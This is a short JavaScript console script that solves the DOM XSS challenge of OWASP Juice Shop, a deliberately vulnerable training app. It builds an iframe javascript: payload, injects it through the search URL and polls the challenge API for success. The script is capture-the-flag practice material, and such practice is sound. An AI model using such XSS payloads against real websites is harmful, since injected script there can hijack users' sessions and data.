
// Automated DOM XSS Solver for OWASP Juice Shop v18
// Run this in the browser console while on the Juice Shop page

function solveDOMXSS() {
    console.log("🎯 Starting DOM XSS Challenge Solver...");
    
    // The payload that will trigger the DOM XSS
    const xssPayload = "<iframe src=\"javascript:alert(`xss`)\"></iframe>";
    
    // Navigate to the vulnerable search page with the payload
    window.location.href = "#/search?q=" + encodeURIComponent(xssPayload);
    
    console.log("✅ DOM XSS payload injected!");
    console.log("⏳ Waiting for execution...");
    
    // Check if the challenge was solved
    setTimeout(() => {
        fetch("/api/Challenges/")
            .then(r => r.json())
            .then(data => {
                const domXss = data.data.find(c => c.name.includes("DOM") && c.name.includes("XSS"));
                if (domXss && domXss.solved) {
                    console.log("🏆 DOM XSS Challenge SOLVED!");
                    alert("DOM XSS Challenge Successfully Solved!");
                } else {
                    console.log("⏳ Challenge not yet marked as solved. The payload may need user interaction.");
                }
            });
    }, 2000);
}

// Execute the solver
solveDOMXSS();
